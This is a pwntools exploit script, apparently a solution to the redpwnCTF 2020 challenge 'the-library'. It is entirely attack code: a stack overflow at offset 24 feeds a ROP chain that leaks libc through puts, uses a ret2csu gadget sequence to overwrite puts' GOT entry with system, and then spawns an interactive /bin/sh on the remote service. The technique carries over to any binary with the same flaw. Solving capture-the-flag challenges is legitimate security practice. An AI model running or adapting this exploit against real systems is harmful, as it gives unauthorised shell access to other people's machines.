from pwn import *

elf = ELF('./the-library')
libc = ELF('./libc.so.6')

offset = 24

puts_got = elf.got['puts']
puts_plt = elf.plt['puts']
read_got = elf.got['read']
ret_gadget = 0x400506
pop_rdi = 0x400733
pop_regs = 0x40072a
call_r12 = 0x400710

payload = b'A' * offset
# leak libc
payload += p64(pop_rdi)
payload += p64(puts_got)
payload += p64(puts_plt)
# ret2csu -> GOT overwrite
payload += p64(pop_regs)
payload += p64(0x0)
payload += p64(0x1)
payload += p64(read_got)
payload += p64(0x0)
payload += p64(puts_got)
payload += p64(0x10)
payload += p64(call_r12)
payload += p64(0xdeadbeef)
payload += p64(0x0)
payload += p64(0x0)
payload += p64(0x0)
payload += p64(0x0)
payload += p64(0x0)
payload += p64(0x0)
payload += p64(ret_gadget)
# exec system('/bin/sh')
payload += p64(pop_rdi)
payload += p64(puts_got + 8)
payload += p64(puts_plt)

#p = process('./the-library')
p = remote('2020.redpwnc.tf', 31350)

p.readuntil('What\'s your name?')
p.sendline(payload)
p.readlines(3)

libc_puts = u64(p.readline().strip().ljust(8, b'\x00'))
libc_base = libc_puts - libc.symbols['puts']
libc_system = libc_base + libc.symbols['system']
libc_binsh = libc_base + next(libc.search(b'/bin/sh'))

log.info(f"libc = {hex(libc_base)}")

payload = p64(libc_system) + b'/bin/sh\x00'
p.sendline(payload)

p.interactive()
